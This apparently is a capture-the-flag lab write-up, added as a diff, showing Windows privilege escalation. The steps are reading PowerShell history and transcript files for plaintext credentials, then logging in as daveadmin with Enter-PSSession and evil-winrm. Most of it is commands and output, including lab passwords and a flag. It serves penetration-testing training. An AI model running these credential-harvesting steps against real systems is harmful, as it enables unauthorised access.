@@ -1,0 +1,44 @@
+Questions 1
+Follow the steps above and obtain an interactive shell as daveadmin on CLIENTWK220 (VM #1). Enter the flag, which can be found on the desktop.
+
+nc 192.168.192.220 4444
+C:\Users\dave> powershell
+PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
+C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+whoami
+ls
+$PSVersionTable
+Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
+Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
+cd C:\xampp
+type passwords.txt
+Clear-History
+Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+Stop-Transcript
+
+PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
+PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+PS C:\Users\dave> Stop-Transcript
+
+# While looking at the transcript we can notice that it is the methods to privilege escalation to daveadmin user. 
+# Follow the command provided
+PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+
+[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
+clientwk220\daveadmin
+[CLIENTWK220]: PS C:\Users\daveadmin\Documents> dir
+[CLIENTWK220]: PS C:\Users\daveadmin\Documents> cd ..
+# While whoami works, other commands do not.
+# We can use evil-winrm. This tool provides various built-in functions for penetration testing such as pass the hash, in-memory loading, and file upload/download
+# Go to kali OS 
+evil-winrm -i 192.168.192.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+
+*Evil-WinRM* PS C:\Users\daveadmin\Desktop> type flag.txt
+OS{2b03157529d1af02bf522f68beb57a0e}
